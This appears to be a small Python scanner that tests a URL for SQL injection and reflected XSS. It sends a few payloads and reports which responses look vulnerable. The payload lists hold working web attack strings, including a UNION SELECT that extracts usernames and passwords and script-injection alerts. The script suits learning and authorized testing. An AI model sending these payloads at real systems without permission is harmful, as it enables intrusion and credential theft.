import requests
from bs4 import BeautifulSoup

def scan_sql_injection(url, payloads):
    """Scan for SQL Injection vulnerability by sending test payloads."""
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"[VULNERABLE] Possible SQL Injection detected at {url} with payload {payload}")
        else:
            print(f"[SAFE] {url} with payload {payload}")

def scan_xss(url, payloads):
    """Scan for XSS vulnerabilities by injecting test scripts."""
    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"[VULNERABLE] Possible XSS detected at {url} with payload {payload}")
        else:
            print(f"[SAFE] {url} with payload {payload}")

# Example usage
target_url = "http://example.com/search?q="  # Replace with actual URL
sql_payloads = ["' OR '1'='1", "' UNION SELECT username, password FROM users --"]
xss_payloads = ['<script>alert("XSS")</script>', '"><img src=x onerror=alert("XSS")>']

scan_sql_injection(target_url, sql_payloads)
scan_xss(target_url, xss_payloads)

